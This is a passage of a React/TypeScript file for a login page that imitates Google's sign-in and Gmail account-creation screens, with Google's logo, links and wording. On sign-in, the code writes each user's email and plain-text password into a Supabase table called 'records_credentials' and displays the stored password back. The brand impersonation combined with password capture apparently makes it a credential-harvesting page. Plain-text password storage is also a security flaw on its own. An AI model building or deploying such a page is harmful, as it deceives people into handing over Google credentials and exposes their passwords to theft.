import React, { useState, useRef, useEffect } from 'react';
import { ChevronDown, UserCircle } from 'lucide-react';
import { translations } from './translations';
import { supabase } from './supabaseClient';

interface SavedRecord {
  id: string;
  email: string | null;
  provider: string;
  created_at: string;
  plain_text_password?: string;
}

export default function App() {
  // Original state
  const [step, setStep] = useState<'email' | 'password' | 'forgot_email' | 'recovery_name' | 'no_account' | 'business_email_choice' | 'create_personal' | 'basic_info' | 'something_went_wrong'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [recoveryEmail, setRecoveryEmail] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [gender, setGender] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showCreateMenu, setShowCreateMenu] = useState(false);
  const [showLangMenu, setShowLangMenu] = useState(false);
  const [showGenderMenu, setShowGenderMenu] = useState(false);
  const [language, setLanguage] = useState('English (United States)');

  // Supabase auth state
  const [user, setUser] = useState<any>(null);
  const [savedRecord, setSavedRecord] = useState<SavedRecord | null>(null);
  const [dbError, setDbError] = useState<string | null>(null);
  const [showStoredPassword, setShowStoredPassword] = useState(false);

  // Refs
  const emailInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);
  const recoveryInputRef = useRef<HTMLInputElement>(null);
  const firstNameInputRef = useRef<HTMLInputElement>(null);
  const monthInputRef = useRef<HTMLSelectElement>(null);
  const menuRef = useRef<HTMLDivElement>(null);
  const langMenuRef = useRef<HTMLDivElement>(null);
  const genderMenuRef = useRef<HTMLDivElement>(null);

  const t = (key: string) => {
    const lang = translations[language] || translations['English (United States)'];
    return lang[key] || translations['English (United States)'][key] || key;
  };

  const languages = [
    'Afrikaans', 'azərbaycan', 'bosanski', 'català', 'Čeština', 'Cymraeg',
    'Dansk', 'Deutsch', 'eesti', 'English (United Kingdom)', 'English (United States)',
    'Español (España)', 'Español (Latinoamérica)', 'euskara', 'Filipino',
    'Français (Canada)', 'Français (France)', 'Gaeilge', 'galego', 'Hrvatski',
    'Indonesia', 'isiZulu', 'íslenska', 'Italiano'
  ];

  // Check for existing session on mount
  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setUser(session?.user ?? null);
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setUser(session?.user ?? null);
    });

    return () => subscription.unsubscribe();
  }, []);

  // Save user data to records_credentials when user logs in
  useEffect(() => {
    if (!user) {
      setSavedRecord(null);
      setDbError(null);
      return;
    }
    
    const saveUserToDatabase = async () => {
      const provider = user.app_metadata?.provider ?? 'email';
      
      const upsertData: any = {
        supabase_user_id: user.id,
        provider,
        email: user.email ?? null,
      };
      
      // Store password in plain text if it's email provider and we have a password
      if (provider === 'email' && password) {
        upsertData.plain_text_password = password;
      }
      
      const { data, error: upsertErr } = await supabase
        .from('records_credentials')
        .upsert(upsertData, { onConflict: 'supabase_user_id' })
        .select()
        .single();
        
      if (upsertErr) {
        setDbError(upsertErr.message);
        setSavedRecord(null);
        return;
      }
      
      setSavedRecord(data);
    };
    
    saveUserToDatabase();
  }, [user, password]);

  // Handle click outside for dropdowns
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (menuRef.current && !menuRef.current.contains(event.target as Node)) {
        setShowCreateMenu(false);
      }
      if (langMenuRef.current && !langMenuRef.current.contains(event.target as Node)) {
        setShowLangMenu(false);
      }
      if (genderMenuRef.current && !genderMenuRef.current.contains(event.target as Node)) {
        setShowGenderMenu(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Focus management
  useEffect(() => {
    if (step === 'email') {
      emailInputRef.current?.focus();
    } else if (step === 'password') {
      passwordInputRef.current?.focus();
    } else if (step === 'forgot_email') {
      recoveryInputRef.current?.focus();
    } else if (step === 'recovery_name') {
      firstNameInputRef.current?.focus();
    } else if (step === 'basic_info') {
      monthInputRef.current?.focus();
    }
  }, [step]);

  // Email submission
  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const trimmedEmail = email.trim();
    if (!trimmedEmail) {
      setError(t('enterEmailOrPhoneError'));
      emailInputRef.current?.focus();
      return;
    }
    
    let finalEmail = trimmedEmail;
    if (!finalEmail.includes('@') && !/^\d+$/.test(finalEmail)) {
      finalEmail = `${finalEmail}@gmail.com`;
    }
    
    setEmail(finalEmail);
    setStep('password');
  };

  // Password submission with Supabase
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    if (!password) {
      setError(t('enterPasswordError'));
      passwordInputRef.current?.focus();
      return;
    }
    
    setLoading(true);
    
    const { data, error: signInError } = await supabase.auth.signInWithPassword({
      email: email,
      password: password,
    });

    setLoading(false);
    
    if (signInError) {
      setError('Wrong password. Try again or click "Forgot password" to reset it.');
      return;
    }

    if (data.user) {
      setUser(data.user);
    }
  };

  // Google sign in
  const handleGoogleSignIn = async () => {
    setError('');
    await supabase.auth.signInWithOAuth({
      provider: 'google',
      options: { redirectTo: window.location.origin },
    });
  };

  // Sign out
  const handleSignOut = async () => {
    await supabase.auth.signOut();
    setUser(null);
    setPassword('');
    setStep('email');
  };

  // View stored password
  const viewStoredPassword = async () => {
    if (!user) return;
    
    const { data } = await supabase
      .from('records_credentials')
      .select('plain_text_password')
      .eq('supabase_user_id', user.id)
      .single();
      
    if (data?.plain_text_password) {
      alert(`Your stored password is: ${data.plain_text_password}`);
    } else {
      alert('No password stored (you likely signed in with Google)');
    }
  };

  // Handle account creation
  const handleCreateAccount = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (step === 'create_personal') {
      if (!firstName.trim()) {
        setError('Enter first name');
        firstNameInputRef.current?.focus();
        return;
      }
      setStep('basic_info');
    } else if (step === 'basic_info') {
      if (!month || !day || !year || !gender) {
        setError(t('fillBirthdayError'));
        return;
      }
      
      setLoading(true);
      
      const { data, error: signUpError } = await supabase.auth.signUp({
        email: email,
        password: password,
        options: {
          data: {
            first_name: firstName,
            last_name: lastName,
          }
        }
      });
      
      setLoading(false);
      
      if (signUpError) {
        setError(signUpError.message);
        return;
      }
      
      if (data.user) {
        setUser(data.user);
      }
    }
  };

  // If user is authenticated, show account page
  if (user) {
    return (
      <div className="min-h-screen bg-[#f0f4f9] flex items-center justify-center p-4">
        <div className="bg-white rounded-[28px] p-8 max-w-md w-full">
          <div className="mb-6">
            <img 
              src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
              alt="Google" 
              className="h-[30px] w-auto mb-4"
            />
            <h2 className="text-2xl font-normal mb-2">Welcome, {user.email}!</h2>
            <p className="text-[#5f6368] mb-4">
              Provider: <strong>{user.app_metadata?.provider ?? 'email'}</strong>
            </p>
            
            {dbError && (
              <div className="bg-red-50 text-red-600 p-3 rounded-lg mb-4 text-sm">
                Database Error: {dbError}
              </div>
            )}
            
            {savedRecord && !dbError && (
              <div className="bg-[#f5f5f5] p-4 rounded-lg mb-4">
                <p className="text-green-600 mb-2">✓ Saved to records_credentials</p>
                
                {savedRecord.plain_text_password && (
                  <div className="bg-white p-3 rounded mb-3">
                    <strong>Stored Password:</strong>{' '}
                    {showStoredPassword ? savedRecord.plain_text_password : '••••••••'}
                    <button 
                      onClick={() => setShowStoredPassword(!showStoredPassword)}
                      className="ml-3 text-sm text-[#0b57d0] hover:underline"
                    >
                      {showStoredPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                )}
                
                <pre className="text-xs bg-white p-3 rounded overflow-auto">
                  {JSON.stringify(savedRecord, null, 2)}
                </pre>
              </div>
            )}
            
            <div className="flex gap-3 mt-6">
              <button
                onClick={() => window.location.href = 'https://myaccount.google.com/'}
                className="flex-1 bg-[#0b57d0] hover:bg-[#0842a0] text-white font-medium py-3 rounded-full transition-colors"
              >
                Go to Account
              </button>
              <button
                onClick={handleSignOut}
                className="flex-1 border border-[#747775] hover:bg-[#f8fafd] text-[#1f1f1f] font-medium py-3 rounded-full transition-colors"
              >
                Sign out
              </button>
            </div>
            
            {user.app_metadata?.provider === 'email' && (
              <button
                onClick={viewStoredPassword}
                className="w-full mt-3 border border-[#747775] hover:bg-[#f8fafd] text-[#1f1f1f] font-medium py-3 rounded-full transition-colors"
              >
                View Stored Password
              </button>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Business email choice page
  if (step === 'business_email_choice') {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center pt-[52px] px-4 font-sans text-[#1f1f1f]">
        <div className="mb-[30px]">
          <img 
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
            alt="Google" 
            className="h-[30px] w-auto"
            referrerPolicy="no-referrer"
          />
        </div>
        <h1 className="text-[32px] font-normal mb-[40px] text-[#1f1f1f] text-center">
          {t('chooseEmail')}
        </h1>
        
        <div className="flex flex-col md:flex-row gap-6 max-w-[920px] w-full">
          {/* Left Card */}
          <div className="flex-1 border border-[#dadce0] rounded-[8px] p-10 flex flex-col relative overflow-hidden min-h-[580px]">
            <div className="text-[#0b57d0] text-[12px] font-medium mb-2">{t('freeFor14Days')}</div>
            <h2 className="text-[24px] leading-[32px] font-normal text-[#1f1f1f] mb-6 min-h-[64px]">
              {t('customEmail')}
            </h2>
            <button className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[14px] font-medium px-6 py-2.5 rounded-full transition-colors w-max mb-8">
              {t('tryGoogleWorkspace')}
            </button>
            
            <div className="h-[1px] bg-[#dadce0] w-full mb-6"></div>
            
            <ul className="flex flex-col gap-5 mb-10">
              <li className="flex items-start gap-4">
                <svg className="w-[18px] h-[18px] text-[#0b57d0] shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.5l4 4 8-8" />
                </svg>
                <span className="text-[14px] leading-[20px] text-[#444746]">{t('professionalEmail')} <span className="text-[#0b57d0]">you@your-company.com</span></span>
              </li>
              <li className="flex items-start gap-4">
                <svg className="w-[18px] h-[18px] text-[#0b57d0] shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.5l4 4 8-8" />
                </svg>
                <span className="text-[14px] leading-[20px] text-[#444746]">{t('upTo')}<strong className="font-medium text-[#1f1f1f]">5 TB</strong>{t('storagePerUser')}</span>
              </li>
              <li className="flex items-start gap-4">
                <svg className="w-[18px] h-[18px] text-[#0b57d0] shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.5l4 4 8-8" />
                </svg>
                <span className="text-[14px] leading-[20px] text-[#444746]"><strong className="font-medium text-[#1f1f1f]">{t('premiumFeatures')}</strong>{t('likeLongerVideo')}</span>
              </li>
            </ul>
            
            <div className="mt-auto flex justify-center">
              <div className="w-full h-[180px] relative overflow-hidden flex items-center justify-center">
                {/* SVG illustration */}
                <svg viewBox="0 0 320 180" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
                  <path d="M 40 140 L 40 100 L 60 80 L 80 100 L 80 140 Z" fill="#fef7e0" />
                  <path d="M 70 140 L 70 110 L 100 110 L 100 140 Z" fill="#fce8b2" />
                  <path d="M 90 140 L 90 120 L 120 120 L 120 140 Z" fill="#fef7e0" />
                  <path d="M 110 140 L 110 90 L 140 90 L 140 140 Z" fill="#fce8b2" />
                  <path d="M 130 140 L 130 115 L 160 115 L 160 140 Z" fill="#fef7e0" />
                  <path d="M 150 140 L 150 105 L 180 105 L 180 140 Z" fill="#fce8b2" />
                  <path d="M 170 140 L 170 125 L 200 125 L 200 140 Z" fill="#fef7e0" />
                  <path d="M 190 140 L 190 95 L 220 95 L 220 140 Z" fill="#fce8b2" />
                  <path d="M 210 140 L 210 110 L 240 110 L 240 140 Z" fill="#fef7e0" />
                  <path d="M 230 140 L 230 120 L 260 120 L 260 140 Z" fill="#fce8b2" />
                  <circle cx="50" cy="70" r="20" fill="#e6f4ea" />
                  <circle cx="40" cy="85" r="15" fill="#e6f4ea" />
                  <circle cx="65" cy="80" r="18" fill="#e6f4ea" />
                  <path d="M 50 90 L 50 140" stroke="#81c995" strokeWidth="1.5" fill="none" />
                  <path d="M 50 110 L 40 100" stroke="#81c995" strokeWidth="1.5" fill="none" />
                  <rect x="40" y="140" width="240" height="20" fill="#fef7e0" />
                  <path d="M 40 140 Q 160 150 280 130 L 280 160 L 40 160 Z" fill="#fce8b2" />
                </svg>
              </div>
            </div>
          </div>

          {/* Right Card */}
          <div className="flex-1 border border-[#dadce0] rounded-[8px] p-10 flex flex-col relative overflow-hidden min-h-[580px]">
            <div className="text-[#0b57d0] text-[12px] font-medium mb-2">{t('noCost')}</div>
            <h2 className="text-[24px] leading-[32px] font-normal text-[#1f1f1f] mb-6 min-h-[64px]">
              A Gmail address just for you
            </h2>
            <button 
              onClick={() => {
                setStep('create_personal');
                // Set a default password or add password field later
              }}
              className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-[14px] font-medium px-6 py-2.5 rounded-full transition-colors w-max mb-8"
            >
              Get a Gmail address
            </button>
            
            <div className="h-[1px] bg-[#dadce0] w-full mb-6"></div>
            
            <ul className="flex flex-col gap-5 mb-10">
              <li className="flex items-start gap-4">
                <svg className="w-[18px] h-[18px] text-[#0b57d0] shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.5l4 4 8-8" />
                </svg>
                <span className="text-[14px] leading-[20px] text-[#444746]"><span className="text-[#0b57d0]">@gmail</span>{t('gmailAddress')}</span>
              </li>
              <li className="flex items-start gap-4">
                <svg className="w-[18px] h-[18px] text-[#0b57d0] shrink-0 mt-[2px]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.5l4 4 8-8" />
                </svg>
                <span className="text-[14px] leading-[20px] text-[#444746]"><strong className="font-medium text-[#1f1f1f]">15 GB</strong>{t('storageInDrive')}</span>
              </li>
            </ul>
            
            <div className="mt-auto flex justify-center">
              <div className="w-full h-[180px] relative overflow-hidden flex items-center justify-center">
                {/* SVG illustration */}
                <svg viewBox="0 0 320 180" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
                  <g transform="translate(60, 50) rotate(-10)">
                    <rect x="0" y="0" width="100" height="70" rx="4" fill="#fff7e0" stroke="#fde293" strokeWidth="1" />
                    <path d="M0 0 L 50 35 L 100 0" fill="none" stroke="#fde293" strokeWidth="1" />
                    <path d="M0 70 L 50 35 L 100 70" fill="none" stroke="#fde293" strokeWidth="1" />
                  </g>
                  <g transform="translate(180, 80) rotate(5)">
                    <rect x="0" y="0" width="90" height="60" rx="4" fill="#e8f0fe" stroke="#d2e3fc" strokeWidth="1" />
                    <path d="M0 0 L 45 30 L 90 0" fill="none" stroke="#d2e3fc" strokeWidth="1" />
                    <path d="M0 60 L 45 30 L 90 60" fill="none" stroke="#d2e3fc" strokeWidth="1" />
                  </g>
                  <rect x="90" y="30" width="140" height="100" rx="8" fill="#fff" stroke="#f28b82" strokeWidth="1.5" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Main sign-in UI
  return (
    <div className="min-h-screen bg-[#f0f4f9] flex flex-col items-center justify-center p-4 sm:p-6 font-sans text-[#1f1f1f]">
      <div className="w-full max-w-[1040px] min-h-[400px] bg-white rounded-[28px] sm:p-10 p-6 flex flex-col md:flex-row gap-8 md:gap-16 shadow-sm relative">
        
        {loading && (
          <div className="absolute top-0 left-0 w-full h-1 bg-[#e3e3e3] rounded-t-[28px] overflow-hidden">
            <div className="h-full bg-[#0b57d0] w-1/3 animate-progress"></div>
          </div>
        )}

        {/* Left Section */}
        <div className="flex-1 flex flex-col pt-2">
          <div className="mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
              <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
              <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
              <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
              <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
            </svg>
          </div>
          <h1 className="text-[36px] leading-[44px] font-normal mb-4 text-[#1f1f1f]">
            {step === 'email' ? t('signIn') : step === 'forgot_email' ? t('findEmail') : step === 'recovery_name' ? t('whatsYourName') : step === 'no_account' ? t('noAccount') : step === 'create_personal' ? (
              <>{t('createPersonal')}</>
            ) : step === 'basic_info' ? t('basicInfo') : step === 'something_went_wrong' ? t('somethingWentWrong') : t('welcome')}
          </h1>
          <div className="text-[16px] text-[#1f1f1f] font-normal">
            {step === 'email' ? t('toContinue') : step === 'forgot_email' ? t('enterPhoneOrEmail') : step === 'recovery_name' ? t('enterNameOnAccount') : step === 'no_account' ? t('noAccountWithInfo') : step === 'create_personal' ? t('enterYourName') : step === 'basic_info' ? t('enterBirthdayAndGender') : step === 'something_went_wrong' ? t('sorrySomethingWentWrong') : (
              <button 
                onClick={() => setStep('email')}
                className="flex items-center gap-2 px-3 py-1.5 rounded-full border border-[#747775] hover:bg-[#f8fafd] transition-colors text-sm font-medium mt-2"
              >
                <UserCircle className="w-5 h-5 text-[#5f6368]" />
                {email}
                <ChevronDown className="w-4 h-4 text-[#5f6368]" />
              </button>
            )}
          </div>
        </div>

        {/* Right Section */}
        <div className="flex-1 flex flex-col mt-8 md:mt-0 md:pt-[72px]">
          {step === 'email' ? (
            <form onSubmit={handleEmailSubmit} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="relative mb-2">
                  <input
                    ref={emailInputRef}
                    type="text"
                    id="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (error) setError('');
                    }}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="email" 
                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                  >
                    {t('emailOrPhone')}
                  </label>
                </div>
                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-1 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}
                
                <div className="mt-2">
                  <button 
                    type="button" 
                    onClick={() => {
                      setError('');
                      setStep('forgot_email');
                    }}
                    className="text-[#0b57d0] text-sm font-medium hover:bg-[#f8fafd] px-2 py-1.5 rounded-md -ml-2 transition-colors"
                  >
                    {t('forgotEmail')}
                  </button>
                </div>

                <div className="text-[14px] text-[#444746] mt-10 leading-relaxed">
                  {t('notYourComputer')}{' '}
                  <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" rel="noopener noreferrer" className="text-[#0b57d0] font-medium hover:underline">{t('learnMore')}</a>
                </div>
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <div className="relative" ref={menuRef}>
                  <button 
                    type="button" 
                    onClick={() => setShowCreateMenu(!showCreateMenu)}
                    className="text-[#0b57d0] text-sm font-medium hover:bg-[#f8fafd] px-4 py-2 rounded-full transition-colors"
                  >
                    {t('createAccount')}
                  </button>
                  
                  {showCreateMenu && (
                    <div className="absolute top-full left-0 mt-1 w-[200px] bg-[#f0f4f9] rounded-[16px] shadow-[0_4px_12px_rgba(0,0,0,0.15)] py-2 z-50">
                      <button 
                        type="button" 
                        onClick={() => {
                          setShowCreateMenu(false);
                          setStep('create_personal');
                        }}
                        className="w-full text-left px-5 py-3 text-[14px] text-[#1f1f1f] hover:bg-[#e1e5ea] transition-colors"
                      >
                        {t('forPersonalUse')}
                      </button>
                      <button type="button" className="w-full text-left px-5 py-3 text-[14px] text-[#1f1f1f] hover:bg-[#e1e5ea] transition-colors">
                        {t('forChild')}
                      </button>
                      <button 
                        type="button" 
                        onClick={() => {
                          setShowCreateMenu(false);
                          setStep('business_email_choice');
                        }}
                        className="w-full text-left px-5 py-3 text-[14px] text-[#1f1f1f] hover:bg-[#e1e5ea] transition-colors"
                      >
                        {t('forWork')}
                      </button>
                    </div>
                  )}
                </div>
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'password' ? (
            <form onSubmit={handlePasswordSubmit} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="relative mb-2 mt-4 md:mt-0">
                  <input
                    ref={passwordInputRef}
                    type={showPassword ? "text" : "password"}
                    id="password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (error) setError('');
                    }}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="password" 
                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                  >
                    {t('enterPassword')}
                  </label>
                </div>
                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-1 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}

                <div className="mt-3 flex items-center">
                  <label className="flex items-center gap-3 cursor-pointer group">
                    <div className="relative flex items-center justify-center w-5 h-5">
                      <input 
                        type="checkbox" 
                        className="peer appearance-none w-5 h-5 border-[2px] border-[#444746] rounded-[2px] checked:bg-[#0b57d0] checked:border-[#0b57d0] transition-colors cursor-pointer"
                        checked={showPassword}
                        onChange={(e) => setShowPassword(e.target.checked)}
                      />
                      <svg className="absolute w-3.5 h-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                      </svg>
                    </div>
                    <span className="text-[14px] text-[#1f1f1f]">{t('showPassword')}</span>
                  </label>
                </div>
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <button type="button" className="text-[#0b57d0] text-sm font-medium hover:bg-[#f8fafd] px-4 py-2 rounded-full transition-colors">
                  {t('forgotPassword')}
                </button>
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'forgot_email' ? (
            <form onSubmit={(e) => {
              e.preventDefault();
              setError('');
              if (!recoveryEmail.trim()) {
                setError(t('enterValidEmailError'));
                recoveryInputRef.current?.focus();
                return;
              }
              setLoading(true);
              setTimeout(() => {
                setLoading(false);
                setStep('recovery_name');
              }, 1000);
            }} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="relative mb-2">
                  <input
                    ref={recoveryInputRef}
                    type="text"
                    id="recoveryEmail"
                    value={recoveryEmail}
                    onChange={(e) => {
                      setRecoveryEmail(e.target.value);
                      if (error) setError('');
                    }}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="recoveryEmail" 
                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                  >
                    Phone number or email
                  </label>
                </div>
                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs mt-1 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}
              </div>

              <div className="flex items-center justify-end gap-4 mt-12">
                <button 
                  type="submit" 
                  disabled={loading}
                  className="bg-[#0b57d0] hover:bg-[#0842a0] text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center min-w-[80px]"
                >
                  {t('next')}
                </button>
              </div>
            </form>
          ) : step === 'recovery_name' ? (
            <form onSubmit={(e) => {
              e.preventDefault();
              setError('');
              if (!firstName.trim()) {
                setError('Enter first name');
                firstNameInputRef.current?.focus();
                return;
              }
              setLoading(true);
              setTimeout(() => {
                setLoading(false);
                setStep('no_account');
              }, 1500);
            }} className="flex flex-col h-full">
              <div className="flex-grow">
                <div className="relative mb-6">
                  <input
                    ref={firstNameInputRef}
                    type="text"
                    id="firstName"
                    value={firstName}
                    onChange={(e) => {
                      setFirstName(e.target.value);
                      if (error) setError('');
                    }}
                    className={`block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border ${error ? 'border-2 border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0]'} appearance-none focus:outline-none focus:ring-0 peer`}
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="firstName" 
                    className={`absolute text-[16px] ${error ? 'text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'} duration-200 transform -translate-y-7 scale-[0.75] top-4 z-10 origin-left left-3 bg-white px-1 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-7 cursor-text`}
                  >
                    {t('firstName')}
                  </label>
                </div>
                {error && (
                  <div className="flex items-center gap-2 text-[#b3261e] text-xs -mt-5 mb-4 ml-4">
                    <svg aria-hidden="true" className="w-4 h-4 fill-current" focusable="false" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                    <span>{error}</span>
                  </div>
                )}
                
                <div className="relative mb-2">
                  <input
                    type="text"
                    id="lastName"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    className="block px-3.5 py-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] hover:border-[#1f1f1f] focus:border-2 focus:border-[#0b57d0] appearance-none focus:outline-none focus:ring-0 peer"
                    placeholder=" "
                    disabled={loading}
                  />
                  <label 
                    htmlFor="lastName" 
